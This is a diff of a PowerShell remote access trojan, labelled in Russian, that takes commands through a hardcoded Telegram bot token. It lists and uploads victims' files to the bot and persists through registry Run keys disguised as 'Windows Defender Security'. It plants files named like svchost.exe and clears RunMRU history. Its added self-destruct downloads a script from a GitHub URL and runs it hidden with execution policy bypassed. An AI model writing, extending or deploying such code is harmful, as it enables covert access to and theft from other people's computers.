@@ -1,4 +1,4 @@
-# RAT через Telegram Bot - ФИНАЛЬНАЯ ВЕРСИЯ С ИНТЕГРИРОВАННЫМ CLEANUP
+# RAT через Telegram Bot - ФИНАЛЬНАЯ ВЕРСИЯ
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -116,100 +116,8 @@ function Compress-Folder {
     }
 }
 
-# Функция очистки RAT (интегрированный cleanup.ps1)
-function Invoke-Cleanup {
-    # Отправляем начало очистки
-    Send-Telegram "🔍 Начинается полная очистка RAT..."
-
-    # 1. Завершаем все процессы RAT
-    Send-Telegram "🔄 Этап 1: Завершение процессов RAT"
-
-    $processes = Get-Process | Where-Object {
-        $_.ProcessName -eq "powershell" -or 
-        $_.ProcessName -eq "pwsh" -or
-        $_.ProcessName -eq "cmd"
-    }
-
-    foreach ($process in $processes) {
-        try {
-            $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
-            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*") {
-                Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
-            }
-        } catch { }
-    }
-
-    # 2. Удаляем файлы RAT
-    Send-Telegram "🔄 Этап 2: Удаление файлов RAT"
-
-    $filesToDelete = @(
-        "$env:WINDIR\System32\Microsoft.NET\Framework64\v4.0.30319\Config\svchost.exe",
-        "$env:TEMP\WindowsSystem.exe",
-        "$env:TEMP\cleanup_*.ps1",
-        "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
-        "$env:TEMP\rat_installed.marker"
-    )
-
-    $deletedFiles = @()
-    foreach ($filePattern in $filesToDelete) {
-        try {
-            Get-ChildItem -Path $filePattern -ErrorAction SilentlyContinue | ForEach-Object {
-                Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
-                $deletedFiles += $_.FullName
-            }
-        } catch { }
-    }
-
-    # 3. Очищаем автозагрузку реестра
-    Send-Telegram "🔄 Этап 3: Очистка реестра"
-
-    $regPaths = @(
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
-        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
-    )
-
-    $regEntries = @()
-    foreach ($regPath in $regPaths) {
-        try {
-            $value1 = Get-ItemProperty -Path $regPath -Name "Windows Defender Security" -ErrorAction SilentlyContinue
-            if ($value1) {
-                Remove-ItemProperty -Path $regPath -Name "Windows Defender Security" -Force -ErrorAction SilentlyContinue
-                $regEntries += "$regPath\Windows Defender Security"
-            }
-            
-            $value2 = Get-ItemProperty -Path $regPath -Name "Windows Audio Service" -ErrorAction SilentlyContinue
-            if ($value2) {
-                Remove-ItemProperty -Path $regPath -Name "Windows Audio Service" -Force -ErrorAction SilentlyContinue
-                $regEntries += "$regPath\Windows Audio Service"
-            }
-        } catch { }
-    }
-
-    # 4. Очищаем историю RUN
-    Send-Telegram "🔄 Этап 4: Очистка истории RUN"
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
-
-    # 5. Финальный отчет
-    $report = @"
-✅ ОЧИСТКА RAT ЗАВЕРШЕНА
-
-Удаленные файлы:
-$($deletedFiles -join "`n")
-
-Удаленные записи реестра:
-$($regEntries -join "`n")
-
-Все следы RAT успешно удалены.
-"@
-
-    Send-Telegram $report
-    return $true
-}
-
-# Установка в автозагрузку
-$installMarker = "$env:TEMP\rat_installed.marker"
+# СИСТЕМА УСТАНОВКИ С МАРКЕРОМ
+$installMarker = "$env:TEMP\system_update_installed.dat"
 
 # Проверяем, не установлен ли уже RAT
 if (!(Test-Path $installMarker)) {
@@ -244,7 +152,7 @@ $currentDir = "C:\"
 $global:LastSentMessage = ""
 $global:LastUpdateId = 0
 
-# Очистка истории сообщений при запуске
+# ПОЛНАЯ ОЧИСТКА ИСТОРИИ СООБЩЕНИЙ ПРИ ЗАПУСКЕ
 try {
     $clearUrl = "https://api.telegram.org/bot$Token/getUpdates?offset=-1"
     Invoke-RestMethod -Uri $clearUrl -Method Get -UseBasicParsing | Out-Null
@@ -257,7 +165,7 @@ Send-Telegram "RAT активирован на $env:COMPUTERNAME
 /ls - список файлов
 /cd [папка] - сменить директорию
 /download [файл] - скачать файл
-/destroy - самоуничтожение"
+/selfdestruct - самоуничтожение"
 
 # Основной цикл опроса
 while ($true) {
@@ -280,7 +188,7 @@ while ($true) {
 /ls - список файлов в текущей директории
 /cd [папка] - сменить директорию
 /download [файл] - скачать файл или папку
-/destroy - самоуничтожение RAT"
+/selfdestruct - самоуничтожение RAT"
                         }
                         "^/ls$" {
                             $items = Get-ChildItem -Path $currentDir -Force
@@ -340,23 +248,27 @@ $($fileList -join "`n")"
                                 Send-Telegram "Файл/папка не найдены: $target"
                             }
                         }
-                        "^/destroy$" {
+                        "^/selfdestruct$" {
                             Send-Telegram "🔄 Запуск процедуры самоуничтожения..."
                             
                             try {
-                                # Запускаем встроенную функцию очистки
-                                $cleanupResult = Invoke-Cleanup
+                                # Загружаем cleanup.ps1 с GitHub
+                                $cleanupScript = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/imsog/system-scanner/refs/heads/main/cleanup.ps1" -UseBasicParsing
                                 
-                                if ($cleanupResult) {
-                                    # Даем время на отправку финального сообщения
-                                    Start-Sleep -Seconds 3
-                                    
-                                    # Завершаем текущий процесс
-                                    Stop-Process -Id $pid -Force
-                                }
+                                $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
+                                $cleanupScript | Out-File -FilePath $cleanupPath -Encoding UTF8
+                                
+                                # Запускаем скрипт очистки в отдельном процессе
+                                Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupPath`"" -WindowStyle Hidden
+                                
+                                # Даем время на запуск cleanup
+                                Start-Sleep -Seconds 2
+                                
+                                # Завершаем текущий процесс
+                                Stop-Process -Id $pid -Force
                                 
                             } catch {
-                                Send-Telegram "❌ Ошибка при самоуничтожении: $($_.Exception.Message)"
+                                Send-Telegram "❌ Ошибка при самоуничтожении"
                                 
                                 # Аварийная очистка
                                 try {
